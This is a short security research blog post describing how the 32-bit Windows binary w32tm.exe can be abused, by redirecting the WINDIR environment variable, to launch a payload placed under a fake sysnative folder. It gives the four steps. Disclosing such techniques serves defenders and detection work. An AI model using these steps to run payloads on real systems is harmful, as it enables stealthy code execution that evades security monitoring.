---
title: Lolbin Wow Ltd x 2
url: https://www.hexacorn.com/blog/2024/03/16/lolbin-wow-ltd-x-2/
source: Hexacorn
date: 2024-03-17
fetch_date: 2025-10-04T12:09:14.161025
---

# Lolbin Wow Ltd x 2

[Skip to primary content](#content)

# [Hexacorn](https://www.hexacorn.com/blog/)

## Hexacorn

Search

### Main menu

* [Home](https://www.hexacorn.com/)
* [Services](https://www.hexacorn.com/services.html)
* [Products & Freebies](https://www.hexacorn.com/products_and_freebies.html)
* [Case Studies](https://www.hexacorn.com/case_studies.html)
* [Contact Us](https://www.hexacorn.com/contact.html)

### Post navigation

[← Previous](https://www.hexacorn.com/blog/2024/03/03/1-little-known-secret-of-explorer-exe/)
[Next →](https://www.hexacorn.com/blog/2024/03/16/stuffing-up-the-windir-env-var-with-the-space/)

# Lolbin Wow Ltd x 2

Posted on [2024-03-16](https://www.hexacorn.com/blog/2024/03/16/lolbin-wow-ltd-x-2/ "10:18 pm")  by  [adam](https://www.hexacorn.com/blog/author/adam/ "View all posts by adam")

I have already [covered](https://www.hexacorn.com/blog/2020/05/23/lolbin-wow-ltd/) [cases](https://www.hexacorn.com/blog/2020/05/23/lolbin-ltd/) where I abused WINDIR environment variable to LOLBINize some WoW executables.

I thought I covered w32tm.exe before, but looking at my blog history I can’t find any reference to it.

So, here it is:

1. copy c:\WINDOWS\SysWOW64\w32tm.exe .
2. set windir=c:\test
3. drop payload as c:\test\sysnative\w32tm.exe
4. execute c:\test\w32tm.exe

[![](https://www.hexacorn.com/blog/wp-content/uploads/2024/03/w32rtm.png)](https://www.hexacorn.com/blog/wp-content/uploads/2024/03/w32rtm.png)

This entry was posted in [LOLBins](https://www.hexacorn.com/blog/category/living-off-the-land/lolbins/) by [adam](https://www.hexacorn.com/blog/author/adam/). Bookmark the [permalink](https://www.hexacorn.com/blog/2024/03/16/lolbin-wow-ltd-x-2/ "Permalink to Lolbin Wow Ltd x 2").

[Privacy Policy](https://www.hexacorn.com/blog/privacy-policy/) [Proudly powered by WordPress](https://wordpress.org/ "Semantic Personal Publishing Platform")